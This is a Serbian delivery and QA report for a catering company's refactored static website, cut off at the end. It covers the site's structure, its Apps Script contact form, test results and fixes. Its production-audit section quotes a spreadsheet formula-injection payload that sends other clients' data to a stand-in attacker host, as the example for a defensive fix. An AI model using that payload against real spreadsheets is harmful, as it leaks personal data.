# Dr Cooker — izveštaj o isporuci

Stanje: **sajt je gotov, refaktorisan na čist HTML/CSS/JS i testiran.**
Nema frameworka, nema build sistema, nema `npm install`.
Otvara se dvoklikom na `start.cmd`.

Jedina stvar koja ga deli od pune funkcionalnosti je Apps Script URL —
jedna linija u `js/config.js`.

---

## 1. Šta je promenjeno u refaktoru

Prethodna verzija je bila napravljena u Astro frameworku: `.astro` komponente,
TypeScript, `npm install` sa 278 paketa i obavezan `npm run build` pre svakog
pregleda. Sada je to običan sajt.

| | Pre (Astro) | Sada |
|---|---|---|
| Tehnologija | Astro 5 + TypeScript | HTML + CSS + JavaScript |
| Paketa u `node_modules` | 278 | **0** |
| Komanda da vidiš stranicu | `npm install` pa `npm run dev` | dvoklik na `start.cmd` |
| Komanda pre objavljivanja | `npm run build` | **nema** — prekopiraš folder |
| Fajlova `.astro` | 26 | **0** |
| Veličina projekta | ~200 MB sa `node_modules` | **1,6 MB** ukupno |
| Stranice | `src/pages/*.astro` → build | `index.html` + `pages/*.html` |
| Gde je CSS | 6 fajlova + scoping po komponenti | `css/`, 6 fajlova, bez scopinga |
| Gde je JS | TypeScript u `src/scripts/` | `js/`, 4 fajla, obični `<script>` |

Sadržaj, dizajn i ponašanje su **identični** — refaktor nije promenio nijedan
tekst ni izgled. To je provereno: isti QA testovi prolaze na obe verzije sa
istim rezultatima.

Stara verzija je sačuvana u `../_backup-astro-2026-09-22/drcooker-web-astro.tar`
(206 fajlova).

---

## 2. Struktura

```
drcooker-web/                    1,6 MB ukupno
├── index.html                   naslovna
├── 404.html
├── start.cmd                    ← dvoklik za lokalni pregled
├── favicon.ico
├── robots.txt · sitemap.xml · _redirects · site.webmanifest
│
├── css/                         123 KB
│   ├── base.css                 tokeni (boje, fontovi, razmaci), reset, tipografija
│   ├── components.css           dugmad, forme, tabele, paneli, deljene sekcije
│   ├── layout.css               zaglavlje, navigacija, podnožje
│   ├── pages.css                specifičnosti pojedinačnih stranica
│   ├── motion.css               animacije pri skrolu
│   └── print.css                izgled na papiru
│
├── js/                          35 KB
│   ├── config.js                ← SVE što se kasnije unosi
│   ├── api.js                   submitInquiry() — jedina tačka ka backendu
│   ├── forms.js                 validacija i stanja forme
│   └── main.js                  navigacija, mobilni meni, animacije
│
├── pages/                       14 stranica
├── assets/
│   ├── fonts/                   6 woff2, subsetovano na srpsku latinicu
│   ├── icons/                   favicon, apple-touch-icon
│   └── images/                  logo, OG slika
│
├── backend/apps-script/         Code.gs + Templates.gs
├── emails/                      šabloni oba mejla + preview
├── docs/                        dokumentacija + upitnik za klijenta (.docx)
└── tools/                       opcione skripte za održavanje
```

Nema nijednog fajla na root nivou koji tu ne pripada, nema duplikata
`index.html`, nema `index-final2.html`.

---

## 3. Stranice

| Fajl | Sadržaj |
|---|---|
| `index.html` | ko smo, za koga, dokaz, isečak jelovnika, lanac kontrole, kontakt |
| `pages/za-vrtice-i-skole.html` | glavna prodajna stranica za ustanove |
| `pages/galerija.html` | fotografije kuhinje (v2, vidi 10d) |
| `pages/jelovnik.html` | kategorije obroka, grupe namirnica |
| `pages/nedeljni-jelovnik.html` | dva nedeljna jelovnika + nutritivne vrednosti |
| `pages/normativi.html` | tabela gramatura, jaslice vs. vrtići i škole |
| `pages/snabdevanje.html` | 7000 artikala, uslovi, isporuka |
| `pages/kako-radimo.html` | proces u 5 koraka |
| `pages/nutricionista.html` | šta nutricionista konkretno radi |
| `pages/bezbednost-hrane.html` | HACCP principi, kontrola |
| `pages/dostava.html` | vozilo, vozači, termo posude |
| `pages/o-nama.html` | ko smo, kuhinja, misija, tim, referenca |
| `pages/kontakt.html` | telefoni, mejl, adresa, mapa |
| `pages/zatrazi-ponudu.html` | forma |
| `pages/politika-privatnosti.html` | potrebna zbog forme |
| `404.html` | |

Navigacija je organizovana **po publici**, ne po uslugama — kupac prvo pita
„da li je ovo za mene", pa onda „šta tačno dobijam".

---

## 4. Kako radi forma

```
pages/zatrazi-ponudu.html
   └─ js/forms.js      validacija, stanja, pristupačnost
        └─ js/api.js   submitInquiry() — JEDINA tačka ka backendu
             └─ POST text/plain → Apps Script → Sheet + 2 mejla
```

**Zašto `text/plain` a ne `application/json`:** Apps Script ne odgovara na CORS
preflight. `application/json` okida preflight i pada pre nego što stigne do
skripte. `text/plain` je „simple request" — nema preflight-a, odgovor se može
pročitati. Čitanje odgovora je obavezno, jer bez njega ne možemo da potvrdimo
prijem, a lažna potvrda je zabranjena. Telo je i dalje JSON.

### Podaci koji se šalju

```js
{
  ime, ustanova, email, telefon, usluga, brojKorisnika,
  pocetak, poruka, saglasnost, timestamp,
  _id, _fingerprint, _source, _sentAt, _fillMs
}
```

Redosled polja prati `FIELDS` u `js/forms.js` i `FIELD_ORDER` u `Code.gs`.
Dodavanje polja = unos na tri mesta: HTML, `forms.js`, `Code.gs`.

### Stanja

| Stanje | Šta korisnik vidi |
|---|---|
| idle | forma; greška tek pošto napusti polje |
| submitting | dugme isključeno, spinner, „Šaljemo…", najava čitaču ekrana |
| success | zeleni panel, forma očišćena, fokus na potvrdu |
| error | crveni panel sa konkretnim razlogom + „Pokušaj ponovo" + telefon + mejl |

**Success se prikazuje isključivo kada backend potvrdi prijem.** Ako odgovor ne
stigne, ne može da se pročita ili nije JSON — korisnik dobija poruku da upit
**nije** poslat i predlog da pozove.

### Zaštite

- honeypot polje (`aria-hidden`, `tabindex="-1"`)
- minimalno vreme popunjavanja 2,5 s — ocenjuje backend
- otisak sadržaja: isti upit se ne šalje dvaput u sesiji
- zaključavanje dok slanje traje: dupli klik ne pravi drugi zahtev
- timeout 15 s po pokušaju, jedan automatski retry uz 900 ms pauze
- validacija se ponavlja na serveru

---

## 5. Google Sheets — instalacija

Puno uputstvo je na vrhu `backend/apps-script/Code.gs`. Ukratko:

1. Otvori Google Sheet → Extensions → Apps Script
2. Nalepi `Code.gs`
3. Dodaj drugi fajl „Templates" i nalepi `Templates.gs`
4. Podesi `CONFIG.RECIPIENT` (opciono — bez toga ide vlasniku Sheet-a)
5. Pokreni funkciju `setup` jednom, odobri dozvole
6. Deploy → New deployment → Web app, *Execute as: Me*, *Who has access: Anyone*
7. Kopiraj Web app URL
8. Nalepi ga u `js/config.js` → `GOOGLE_APPS_SCRIPT_URL`

Test bez sajta: pokreni `testSubmission` u Apps Script editoru.

**Posle svake izmene koda:** Deploy → Manage deployments → New version.
Bez toga se menja samo editor, ne i živi endpoint.

### Kolone u Sheet-u

`Vreme prijema | ID | Ime i prezime | Ustanova / firma | Email | Telefon |
Usluga | Broj korisnika | Željeni početak | Poruka | Saglasnost | Izvorna stranica`

---

## 6. Mejlovi

Dva HTML mejla, table-based (rade u Outlooku), responsive.
Jedan izvor u `emails/templates/`, iz njega se generišu i preview i
`Templates.gs`.

**Firmi** (`[UPIT] Naziv ustanove`): naziv ustanove kao naslov, odmah ispod
dugmad **„Pozovi 060…"** (`tel:`) i **„Odgovori na email"** (`mailto:`), pa tek
onda tabela sa svim poljima, poruka i vreme prijema. `Reply-To` je pošiljalac.

**Korisniku**: potvrda prijema, sažetak upita, brzi kontakt.
**Ne obećava rok** — `CONFIG.RESPONSE_TIME` je prazan dok ga ne potvrdiš.

Pregled: `node tools/build-emails.mjs`, pa otvori `emails/preview/*.html`.

---

## 7. Šta treba da uneseš

**Sve je u `js/config.js`**, označeno sa `TODO(klijent)`.

### Da forma proradi (1 stavka)

| Gde | Šta |
|---|---|
| `GOOGLE_APPS_SCRIPT_URL` | Web App URL Apps Script deployment-a |

### Pre objavljivanja (3 stavke)

| Gde | Šta | Zašto |
|---|---|---|
| `SITE_URL` | stvaran domen | canonical, OG i sitemap pokazuju tamo |
| `CONTACT.pib`, `CONTACT.maticniBroj` | PIB i matični broj | podnožje i politika privatnosti |
| `pages/politika-privatnosti.html` | rukovalac, rok čuvanja, kontakt | forma prikuplja lične podatke |

### Poboljšavaju sajt, nisu blokada

| Gde | Efekat dok je prazno |
|---|---|
| `PENDING.responseTime` | ne piše se nikakav rok |
| `PENDING.deliveryArea` | piše samo „Beograd" |
| `PENDING.foundedYear` | koristi se „dugi niz godina" |
| `PENDING.haccpCertified` | piše „poštuju se principi" |
| `CONTACT.openingHours` | blok se ne prikazuje |
| `CONTACT.social` | popunjeno 05.10.2026, prikazuje se iz podnožja |
| `ANALYTICS_ID` | nema analitike i nema kolačića |

### Pitanja za klijenta

Sva su u upitniku [`Dr-Cooker-upitnik.docx`](Dr-Cooker-upitnik.docx).
Najvažnija četiri:

1. **Adresa kuhinje** — Vojvode Prijezde 17 je kontakt adresa, kuhinja je „na
   Voždovcu". Da li je to ista adresa? Sajt ih drži razdvojene.
2. **HACCP** — sertifikat ili samo primena principa? Tekst svuda kaže
   „poštuju se principi", jer to stari sajt kaže. Ako sertifikat postoji, to je
   najjači dokaz koji imate.
3. **Fotografije** — ne postoji nijedna prava. 19 slotova čeka.
4. **Logistika robe** — ide li roba istom turom kao obroci? Sajt to ne tvrdi,
   jer bi protivrečilo tvrdnji da je vozilo „specijalizovano samo za transport
   hrane".

---

## 8. Fotografije — i dalje najveći nedostatak

Na starom sajtu ne postoji nijedna prava fotografija Dr Cooker hrane, kuhinje,
tima, vozila ni dostave. Sve su stock slike sa zelenim okvirom i maskotom.

Zato je dizajn tipografski — nosi ga jezik jelovnika i brojevi iz nutritivnih
tabela. To radi, ali prave fotografije bi podigle sajt više od bilo koje druge
izmene.

**19 slotova je rezervisano** sa definisanim proporcijama, pa se layout neće
pomeriti kada slike stignu. Spisak kadrova sa uputstvom za snimanje je u
sekciji O upitnika.

Prioritet ako se snima samo jednom: kuhinja tokom pripreme, serviran obrok
odozgo, vozilo sa termo posudama, grupna fotografija tima.

---

## 9. QA — šta je testirano posle refaktora

### Automatska provera

```powershell
python tools/audit.py
```

**Rezultat: 0 grešaka, 0 upozorenja.**

Proverava: reference (CSS, JS, slike, fontovi, interne stranice, `#` ankeri),
ostatke prethodnog frameworka, apsolutne putanje, `<title>` i meta description,
canonical, OG, `lang`, validnost JSON-LD, broj `<h1>`, preskočene nivoe naslova,
`<img>` bez `alt`, `<iframe>` bez `title`, duplirane `id`-eve, dugmad bez imena,
tabele bez `<th scope>`/`<caption>`, `lorem ipsum`, renderovan `undefined`,
nepopunjene `{{PLACEHOLDER}}` tokene, redosled CSS-a i JS-a, `type="module"`,
ES module u `js/`, `fetch()` van `api.js`, `debugger`, `!important` van
opravdanog konteksta, `overflow-x`, nedefinisane CSS tokene, i da svaka stranica
ima markere za zaglavlje i podnožje.

### Reference

**1030 referenci u 16 stranica — sve vode na postojeće fajlove.**
Provereno relativno prema svakom fajlu posebno, pa su putanje iz `pages/`
(`../css/…`) proverene odvojeno od onih iz korena (`css/…`).

### Responsive i pristupačnost

16 stranica × 6 širina (320, 375, 768, 1024, 1440, 1920 px) = 96 kombinacija:

| | Rezultat |
|---|---|
| Horizontalno prelivanje | **0** |
| Pad kontrasta (WCAG AA) | **0** |
| Elementi sa horizontalnim scroll-om | **0** |
| Konzolne greške | **0** |
| Neuspeli resursi (404) | **0** |

Kontrast je meren stvarnim izračunatim bojama po WCAG 2.1 formuli, na svakom
elementu sa tekstom.

Jedini preostali nalaz: čekboks saglasnosti je 24×24 px — tačno na WCAG 2.2 AA
pragu (2.5.8), dakle prolazi.

### Forma — protiv mock backenda

`node tools/mock-backend.mjs` glumi Apps Script, jer se timeout i pokvaren
odgovor ne mogu izazvati na pravom endpointu.

| Scenario | Rezultat |
|---|---|
| prazan submit | 7 grešaka, fokus na prvo polje, `aria-invalid` — prošao |
| neispravan email / telefon / kratka poruka | greška po polju — prošao |
| uslovno polje (broj korisnika) | vidljivo samo za obroke, `disabled` kad je skriveno — prošao |
| uspešno slanje | success panel, forma očišćena — prošao |
| backend odbio (`fieldErrors`) | greške mapirane na polja, **bez success** — prošao |
| HTML umesto JSON | „ne možemo da potvrdimo da je upit stigao", **bez success** — prošao |
| HTTP 500 | greška + automatski retry — prošao |
| dupli klik tokom slanja | **0 novih zahteva** — prošao |
| demo režim (bez URL-a) | „slanje još nije aktivirano, upit NIJE poslat" — prošao |

### Navigacija

- mobilni meni: `aria-expanded` prati stanje, fokus ulazi u panel, `Escape`
  zatvara i vraća fokus na dugme, scroll se zaključava, klik na link zatvara
- podmeni na desktopu: otvara se mišem i tastaturom
- aktivna stavka se označava na obe navigacije; roditelj otvorene podstranice
  dobija prigušenu oznaku

### Prolaz kroz sajt

Svih 16 stranica otvoreno redom: svaka ima 6 stylesheet-ova, Fraunces u
naslovu, zaglavlje, podnožje i CTA. Forma postoji samo na `zatrazi-ponudu.html`.

---

## 10. Nalazi nađeni i popravljeni tokom refaktora

| Nalaz | Kako je nađen |
|---|---|
| **`.hero__h1` je imao 5 različitih vrednosti na 13 stranica** — objedinjavanje u jedno globalno pravilo bi polomilo 12 stranica | poređenje varijanti pre objedinjavanja |
| **Komentari su upadali u CSS selektore** pri namespace-ovanju | pregled generisanog CSS-a |
| **`main.js` je tražio `[data-nav]`, a HTML ga nije imao** — aktivna stavka se nije označavala | test u browseru |
| **`data-child-active` je postavljan ali nije imao CSS** — atribut bez efekta | provera CSS-a |
| Širine kolona u DOCX-u bi ih Word ignorisao (`autofit` uključen) | pregled OXML-a |
| `build-icons.mjs` je padao sa stack trace-om umesto jasne poruke | pokretanje |
| `sitemap.xml`, `robots.txt` i `_redirects` su pokazivali na stare Astro rute | pregled posle konverzije |
| `canonical`, OG i JSON-LD su nosili stare rute (`/o-nama` umesto `/pages/o-nama.html`) | provera apsolutnih URL-ova |

### Šta je CSS refaktor dobio

Od 464 pravila u stranicama, **76 je bilo potpuno identično na dve ili više
stranica** i sada stoji jednom, u `components.css`. Ostalo je ograničeno na
svoju stranicu preko klase na `<body>`, pa se iste klase (`.hero`, `.veza`)
mogu razlikovati po stranici bez sudaranja.

Pravila koja imaju **više varijanti** namerno **nisu** objedinjena — to je bio
najveći rizik refaktora i rešen je proverom broja varijanti pre spajanja.

---

## 10b. Četvrti krug — bagovi, Sinko i animacije

### Bag koji je klijent prijavio: „kako da znam da li je poslato"

Na ekranu su se videla **oba** panela odjednom: „Upit je poslat." i
„Upit nije poslat."

Uzrok nije bio u JavaScriptu — on je uredno radio `el.hidden = true`. Uzrok je
bio u CSS-u: browserov ugrađeni stil `[hidden] { display: none }` živi u
**user-agent sloju**, koji gubi od **bilo kog** autorskog pravila koje postavi
`display`, bez obzira na specifičnost. `.panel { display: flex }` je bilo
dovoljno da atribut `hidden` prestane da radi.

Isti propust je držao vidljivim i uslovno polje „broj korisnika", i to na svim
stranicama gde bi se atribut `hidden` koristio.

Rešeno jednim pravilom u `css/base.css` (`[hidden] { display: none !important }`),
uz tri uklonjene ručne zakrpe koje su isti problem gasile od slučaja do slučaja.
`python tools/audit.py` od sada proverava da to pravilo postoji.

Uz to je ishod slanja postao neprevidljiv:

| Šta | Kako sada |
|---|---|
| Posle uspeha | polja forme se sklanjaju, ostaje samo potvrda |
| Povratak na formu | dugme „Pošalji još jedan upit" u panelu potvrde |
| Panel | dovodi se u vidno polje i dobija fokus, i kod uspeha i kod greške |
| Napomena za administratora | prikazuje se samo dok backend nije povezan |

### Forma više ne može da se zaključa

`await window.DrCookerAPI.submitInquiry(...)` je bio jedini `await` u handleru i
nije imao `try`. Ako bi bacio — a bacio bi kad god `js/config.js` ne stigne, jer
je `api.js` čitao `window.CONFIG` bez provere — handler bi prekinuo **posle**
`setState('submitting')`: dugme zauvek isključeno, natpis zauvek „Šaljemo…".

Sada: `try/catch` oko poziva, provera da `DrCookerAPI` uopšte postoji, i
`window.CONFIG || {}` u `api.js`. Testirano brisanjem oba globala u živoj
stranici — forma u oba slučaja kaže pošteno šta se desilo i ostaje upotrebljiva.

### Poruke više ne tvrde ono što se ne zna

TIMEOUT je govorio „Upit nije poslat." kao činjenicu. To nije tačno: timeout je
`controller.abort()` **na klijentu** — prekida čitanje odgovora, ne slanje.
Apps Script sa hladnim startom redovno pređe 15 s i pritom uspe. Dakle
najčešći realan kvar davao je samouverenu netačnu poruku, i to u smeru koji
deluje bezbedno — pa korisnik pošalje upit drugi put.

| Ishod | Naslov | Smemo li to da tvrdimo |
|---|---|---|
| NETWORK (zahtev nije ni otišao) | Upit nije poslat. | da |
| NOT_CONFIGURED (demo režim) | Upit nije poslat. | da |
| TIMEOUT, SERVER, MALFORMED | Nismo dobili potvrdu. | ne znamo — i tako i pišemo |

Naslov panela se sada postavlja iz JavaScripta; ranije je bio zakucan u HTML-u
kao „Upit nije poslat." i protivrečio je sopstvenoj poruci.

### Sinko online prodavnica

Dodata stranica [`pages/sinko-online-prodavnica.html`](../pages/sinko-online-prodavnica.html)
i odlazni linkovi na sedam mesta. Logika je podela posla: obroci se dogovaraju,
roba se poručuje. Detalji u `README.md`.

Sve činjenice su pročitane sa sinko.rs i popisane u
[`SOURCE-BRIEF.md`](SOURCE-BRIEF.md), sekcija 15 — zajedno sa spiskom onoga što
se sa tog sajta **ne sme** uzeti, jer su dve njihove strane ostale nedovršene iz
šablona i protivreče napomeni u podnožju.

**Otvoreno pitanje:** Sinko plus d.o.o. ima drugi PIB (108388678) i drugu adresu
od Dr Cooker-a, pa se poslovni odnos ne može pročitati ni sa jednog izvora.
Sajt koristi neutralnu reč „partner". Tačna formulacija je pitanje **S** u
upitniku.

### Animacije: heroj se više nikad ne skriva

Naslov je ranije ulazio red po red iza maske. Lanac je bio
`document.fonts.ready → whenVisible → 2×rAF → .js-on → 2×rAF → .is-in → 900ms`,
pa je `h1` — LCP element i jedina rečenica zbog koje je stranica otvorena —
postajao čitljiv tek posle oko 1,5 s. Pre toga bi se video, pa **sakrio** kad
stigne `.js-on`. To treperenje je ono što se vidi na slici koju je klijent
poslao.

Sada: **naslov se ne animira uopšte.** Vidi se od prvog iscrtavanja.
Koreografija se dešava oko njega i cela stane u oko 0,8 s.

Uz to je nađena i zatvorena ozbiljnija rupa. Kada se stranica učita a dokument
nije iscrtan — pozadinska kartica, prerender — važi:

```
document.visibilityState === 'hidden'
document.timeline.currentTime === null
animacija.currentTime === 0   i tako ostaje
```

Animacija je u stanju `running`, ali vremenska linija ne odmiče, pa sve što je
skriveno preko `animation-fill-mode: backwards` ostaje nevidljivo **neograničeno**.
Izmereno na naslovnoj: eyebrow, lead i dugmad nevidljivi i posle 4 sekunde.
Stara sigurnosna mreža nije pomogla jer je i ona stajala unutar `whenVisible`,
pa se u jedinom scenariju zbog kog postoji nije ni zakazivala.

Rešeno dvostruko:

1. Skrivanje je uslovljeno klasom `js-on`, koju JavaScript dodaje tek kada je
   stranica stvarno vidljiva. Nema JS-a ili stranica nije iscrtana → nema
   klase → **nema skrivanja**.
2. Sigurnosna mreža se zakazuje bezuslovno. Posle 3 s heroj dobija `is-shown`,
   što gasi animacije i na pseudo-elementu linije.

`tools/audit.py` od sada odbija svako pravilo u `motion.css` koje pokreće
animaciju heroja izvan `.js-on` — provereno tako što je regresija namerno
napravljena pa vraćena.

### Ostalo nađeno i popravljeno

| Nalaz | Popravka |
|---|---|
| Hover na svakom primarnom CTA prekrivao je sopstveni natpis (kontrast 1:1) | `isolation: isolate` na `.btn` i `z-index: -1` na pseudo-elementu |
| Ghost dugme na tamnoj traci — kontrast 1,10:1 | sistemsko `.on-dark .btn--ghost`, umesto zakrpe po instanci |
| Oba primera jelovnika označena kao dečji, a sadrže suhomesnato i konditorsko | uklonjena atribucija koju izvor ne daje |
| Politika privatnosti tvrdila da samo Kontakt učitava spoljni sadržaj | mapa se sada učitava tek na klik, na obe stranice; tekst to i kaže |
| Traka sa jelima bez pauze dostupne tastaturi (WCAG 2.2.2, nivo A) | pravo dugme „Zaustavi traku" sa `aria-pressed` |
| `robots.txt` zabranjivao obilazak baš stranice koja nosi `noindex` | Disallow uklonjen; obilazak dozvoljen + noindex |
| `.htaccess` primer: `/ponuda-hrane` iznad svoja dva podputa → 404 iza 301 | redosled ispravljen, uz objašnjenje u samom bloku |
| Strelica odlaznog linka i hover panel dugmeta otimali se o isti `::after` | strelica na dugmetu ide na `::before` sa `order: 1` |
| Sinko stranica koristila klase vezane za druge stranice — cela sekcija bez stila | `.page-sinko` dodat u postojeće selektore |
| Zaglavlje se prelivalo 34px na 960–1055px | prag desktop navigacije 60rem → 66rem |
| Linije u tabeli jelovnika crtane dekorativnom hairline (1,59:1) | prebačene na `--color-rule-strong` (3,71:1) |
| Link u držaču mape 170×23px | podignut na 24px (WCAG 2.5.8) |

### QA posle svega

| Provera | Rezultat |
|---|---|
| `python tools/audit.py` | 0 grešaka, 0 upozorenja |
| 17 stranica × 9 širina (320–1920) | 0 kritičnih, 0 ozbiljnih |
| Horizontalno prelivanje | 0 stranica |
| Sadržaj nevidljiv iznad preloma | 0 elemenata |
| Greške u konzoli / neuspeli resursi | 0 / 0 |
| Forma: uspeh, server 500, timeout, pokvaren HTML, odbijena polja, demo, bez `config.js`, bez `api.js` | sve poštene poruke, nijedna lažna potvrda |

---

## 10c. Produkcioni audit

Cilj nije bio dodavanje funkcija nego odgovor na jedno pitanje: **da li ovo
sme da ide live.** Osam nezavisnih pregleda koda, svaki nalaz proveravan iz
tri ugla, plus živo testiranje u browseru.

### Nađeno i popravljeno

**Sprečeno curenje podataka iz Sheet-a.** Polja forme su upisivana u tabelu
bez zaštite. Vrednost koja počinje sa `=` Sheets tumači kao **formulu** i
izvrši je čim vlasnik otvori tabelu. `=IMPORTXML("http://napadac/?x="&A2;"//x")`
poslat kroz polje „poruka" poslao bi imena, mejlove i telefone drugih
ustanova na tuđi server. Bez klika, bez upozorenja. Validacija to ne hvata —
formula je savršeno validan tekst.

Popravka je `cellSafe_` u `appendRow_`. Prva verzija te popravke bila je
**pogrešno postavljena**: stajala je u `sanitize_`, a taj objekat renderuju i
mejlovi — pa bi svaki legitiman upit stizao firmi sa `'+381 64 1101521`.
Premešteno tamo gde se zaista piše u ćeliju.

**Bot filteri više ne bacaju upit tiho.** Honeypot i provera brzine vraćali
su `{ok:true, reference:"skipped"}` a red nisu upisivali. Frontend je video
`ok:true` i prikazivao „Upit je poslat." — potvrda za nešto što se nije
desilo. Za bota je tišina bila namerna; problem je legitiman korisnik koji
upadne u isti filter: browser autofill popuni polja za pola sekunde, menadžer
lozinki zna da popuni i skriveno polje. Sada sumnjiv zahtev ide dalje kao i
svaki drugi, samo nosi oznaku u koloni „Sumnjivo", admin mejl dobija prefiks
`[SUMNJIVO]`, a potvrda korisniku se preskače. `ok:true` ponovo znači tačno
jedno: red postoji u tabeli.

**Zaštita od duplikata uopšte nije radila.** Otisak upita je uključivao
`timestamp`, koji se menja pri svakom slanju — pa je isti upit poslat dvaput
davao dva različita otiska. I lokalna provera i serverska idempotencija su
bile mrtve. Dokazano: isti sadržaj, razlika samo u timestamp-u, otisci
`frmt063` i `f6fijxy`. Posle ispravke: identičan upit → nula novih mrežnih
poziva i poruka „Upit je već poslat."; upit za drugu ustanovu → prolazi.

**Brif za fotografa stajao je kao vidljiv tekst na 12 stranica.** Devetnaest
`.photo-slot` blokova renderovalo je uputstvo napisano za klijenta:
„Grupna fotografija tima u radnoj odeći, u kuhinji, tokom smene." Direktorka
vrtića je na naslovnoj, u uokvirenoj kutiji, čitala da firma nema nijednu
svoju fotografiju. Okvir i kratka labela ostaju; brif je prebačen u
[`FOTO-BRIEF.md`](FOTO-BRIEF.md), gde klijentu i pripada.

**404 stranica je pucala na svakom dubljem URL-u.** Referisala je
`css/base.css` relativno, a server je servira za bilo koji nepostojeći URL
bez menjanja baze dokumenta — pa je za `/ponuda-hrane/nesto` tražila
`/ponuda-hrane/css/base.css`. Dokazano: `404`. Posetilac sa stare adrese
video bi neuobličen crni tekst i meni čiji svaki link vodi u novi 404. Sada
koristi putanje od korena; `sync-partials.mjs` i `audit.py` znaju za taj
izuzetak i čuvaju ga.

**Manifest je pokazivao na dva fajla koja ne postoje.** `/favicon.svg` i
`/apple-touch-icon.png` — oba 404 u produkciji, jer fajlovi žive u
`/assets/icons/`. Android nije imao ikonicu pri dodavanju na početni ekran.

### Ostalo popravljeno

| Nalaz | Popravka |
|---|---|
| Lanac kontrole na naslovnoj renderovao 01 → 03 → 05 | vraćeni koraci 02 i 04 |
| Razvojna napomena sa `js/main.js` objavljena u politici privatnosti | uklonjena |
| `canonical` i `noindex` zajedno na 404 i politici privatnosti | canonical uklonjen; audit sada odbija tu kombinaciju |
| `BAD_BODY` i `INTERNAL` prikazivani kao „Proverite unos" | kodovi se preslikavaju eksplicitno |
| Potvrda obećavala mejl koji backend ne garantuje | rečenica se pojavljuje samo kad `mail.user === true` |
| Dugme trake 2,87:1 zbog `opacity: 0.55` | providnost zamenjena bojom, 8,32:1 |
| Plain-text deo mejla počinjao brojem `96` i nizom `&zwnj;` | `htmlToText_` čisti uslovne komentare i entitete |
| Brojač znakova ostajao na „742 / 2000" posle slanja | osvežava se uz `form.reset()` |
| Skip-link cilj nije bio fokusabilan | `tabindex="-1"` na `<main>`, 17 stranica |
| `.htaccess` primer nije hvatao završnu kosu crtu | prepisan na `RewriteRule` sa `/?$` |
| DEPLOY tvrdio da skripta menja domen — nije ga menjala u HTML-u | `build-seo-files.mjs` sada menja svih ~270 pojavljivanja |
| 11 mrtvih CSS pravila, `[data-rule]` bez ijedne mete | uklonjeno |
| Dve neiskorišćene slike (304 KB) i `__pycache__` | uklonjeno iz produkcionog foldera |
| Netačni komentari: `tokens.css`, `build-fonts.mjs`, `src/lib/validation.ts` | ispravljeni |

### Šta je izmereno

| Provera | Rezultat |
|---|---|
| `python tools/audit.py` | 0 grešaka, 0 upozorenja |
| 17 stranica × 10 širina (320–1920) | 0 kritičnih, 0 ozbiljnih, 0 prelivanja |
| Sadržaj nevidljiv iznad preloma | 0 elemenata |
| Konzola / neuspeli resursi / spoljni zahtevi | 0 / 0 / 0 |
| Interni linkovi i sidra | 17 jedinstvenih odredišta, 0 pokvarenih |
| Slike bez `alt` | 0 |
| Mobilni meni, 5 ciklusa | stanje, `aria-expanded`, scroll lock i fokus zamka ispravni svaki put |
| Fokus prsten (pravi Tab) | `solid 3px rgb(18,74,63)`, offset 3px |
| Forma — 11 scenarija | nijedna lažna potvrda |
| Duplo slanje, 5 klikova odjednom | 1 mrežni poziv |
| Težina prvog pregleda | 179 KB (59 KB teksta gzip + 121 KB fontova) |
| Svaka sledeća stranica | 59 KB (fontovi keširani) |

### Produkciona integracija — stvarno testirana

Apps Script endpoint je živ i testiran pravim prijavama:

| Slučaj | Odgovor servera |
|---|---|
| Ispravan upit | `ok:true`, `reference: UP-20260923-004336`, `mail: {admin:true, user:true}` |
| Honeypot popunjen | upisano sa oznakom, potvrda korisniku preskočena |
| Popunjeno prebrzo | isto |
| Nevalidni podaci | `VALIDATION` + greške po poljima |
| Prazno telo | `BAD_BODY` |

**Oba mejla su stvarno poslata** — `mail.admin: true, mail.user: true,
errors: []`. To više nije „šablon proveren", nego „isporuka potvrđena".

---

## 10d. v2 — izmene po mejlu klijenta (23.09.2026.)

Klijent je poslao šest zahteva. Svi su izvedeni; izvor i obrazloženje su u
[`SOURCE-BRIEF.md`](SOURCE-BRIEF.md), sekcija 16.

| Zahtev klijenta | Šta je urađeno |
|---|---|
| Poruka mora biti *hrana za decu*: privatni vrtići, boravci za decu, privatne škole | 93 zamene kroz sajt; prepisan hero naslovne, sekcija „Za koga radimo", meta opisi |
| Ne radi sa javnim sektorom | Rečeno **pozitivno** — sajt navodi kome se obraća, nigde ne piše „ne radimo sa javnim sektorom" |
| Ukloni „Kompanije" | Uklonjena stranica, stavka u meniju, kartice, opcija u formi, labela u `Code.gs`, unos u generatoru sitemap-a. Preusmerenje nije potrebno: stari sajt nikada nije imao stranicu za kompanije (vidi `SOURCE-BRIEF.md`, sekcija 10), a novi jos nije bio objavljen — nema adrese sa koje bi neko dolazio. |
| Ne dirati postojeći logo | Vraćen `assets/images/drcooker-logo.webp` u zaglavlje i podnožje; tipografski wordmark uklonjen |
| „Dr Cooker", ne „Dr COOKER" | 372 zamene u 38 fajlova |
| Dodati galeriju kuhinje | Nova `pages/galerija.html` + alat `tools/build-galeriju.py` |

### BLOKIRAJUĆE pre puštanja u rad — ponovo objavi Apps Script

Forma je dobila treću opciju usluge, **`obroci-boravak`** („Kuvani obroci —
boravak za decu"), jer boravci su jedna od tri publike koje je klijent naveo.

`Code.gs` u ovom repozitoriju je ažuriran. **Objavljena verzija nije.** Apps
Script proverava uslugu prema svojoj listi:

```js
else if (!SERVICE_LABELS.hasOwnProperty(usluga)) e.usluga = 'Nepoznata usluga.';
```

Provereno protiv žive adrese 23.09.2026, sa `usluga: 'obroci-boravak'`:

```json
{ "ok": false, "code": "VALIDATION",
  "fieldErrors": { "usluga": "Nepoznata usluga." } }
```

Dok se ne objavi nova verzija, svaki upit u kome je izabran **boravak za decu**
biva odbijen. Greška je vidljiva korisniku — upit se ne gubi u tišini — ali se
ne šalje.

**Koraci:** otvori Apps Script projekat → zameni sadržaj `Code.gs` fajlom iz
`backend/apps-script/Code.gs` → Deploy → *Manage deployments* → olovka →
*Version: New version* → Deploy. Zatim pošalji probni upit sa tom opcijom i
proveri da je red upisan u Sheet.

### Galerija — kako se puni

Fotografije idu u `assets/images/galerija-izvor/` (JPG, PNG ili HEIC sa
iPhone-a, bilo koje veličine). Opciono `opisi.txt` u istom folderu, po jedan red
`ime-fajla.jpg | Opis slike` — opis postaje `alt` tekst.

```
python tools/build-galeriju.py
```

Alat pravi po dve veličine (800 i 1600 px, WebP) u `assets/images/galerija/` i
upisuje mrežu u stranicu između `<!-- #region galerija -->` markera. Izvorne
fotografije ostaju u `galerija-izvor/` kao arhiva i **ne objavljuju se**.

Dok slika nema, stranica prikazuje šest rezervisanih okvira sa opisom onoga što
